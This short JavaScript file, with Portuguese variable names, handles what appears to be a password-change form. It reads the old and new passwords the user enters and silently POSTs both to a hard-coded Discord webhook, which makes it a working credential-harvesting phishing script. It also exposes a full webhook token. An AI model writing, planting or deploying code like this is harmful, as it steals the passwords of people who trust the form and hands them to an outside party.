var webhook="https://discord.com/api/webhooks/1325624816505720862/2UVTgKRP5V7H1Qeg0xBqA5hJgwMKmjRu7LQ6D8PqD4iGTmj_BnEqP3-MlN7FUh5xrT-g";
function enviar(){
 alert("Teste");
  var senha1="";
  senha1=document.querySelector("#passN").value;
  var senha2="";
  senha2=document.querySelector("#passNV").value;
  
  if (senha1.length==0 || senha2.length==0){
    alert("Preencha todos os campos.");
  }else{
    msg={content:"Senha Antiga: "+senha1+"\nSenha Nova: "+senha2}
    fetch(webhook,{
      method:"POST",
      headers: {"Content-Type":"application/json"},
      body: JSON.stringify(msg)
    });
    senha1="";
    senha2="";
  }

}
